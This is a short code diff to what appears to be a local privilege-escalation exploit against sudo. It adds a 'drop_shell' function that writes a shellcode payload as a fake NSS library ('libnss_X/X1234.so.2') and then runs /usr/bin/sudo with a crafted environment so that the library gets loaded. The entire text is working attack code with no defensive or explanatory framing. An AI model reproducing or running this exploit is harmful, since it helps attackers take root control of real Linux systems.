@@ -1,4 +1,5 @@
 #include "lpe.h"
+#include "shellcode.h"
 #include "utils.h"
 #define ENV_LEN 512
 #define TARGET_OFFSET_START 0x786
@@ -23,6 +24,13 @@ void write_exe_to_tmp() {
 
   DEBUG_LOG("write cwd %s to %s", path, TMP_PATH);
   fclose(tmp);
+}
+
+void drop_shell() {
+  FILE *p = global->fopen("libnss_X/X1234.so.2", "w");
+  global->fwrite(SHELLCODE_BIN, sizeof(char),
+                 sizeof(SHELLCODE_BIN) / sizeof(char), p);
+  global->fclose(p);
 }
 
 void try_get_root(void *g) {
@@ -75,6 +83,7 @@ void try_get_root(void *g) {
   envp[env_pos++] = 0;
 
   write_exe_to_tmp();
+  drop_shell();
 
   global->execve("/usr/bin/sudo", e_argv, envp);
 }
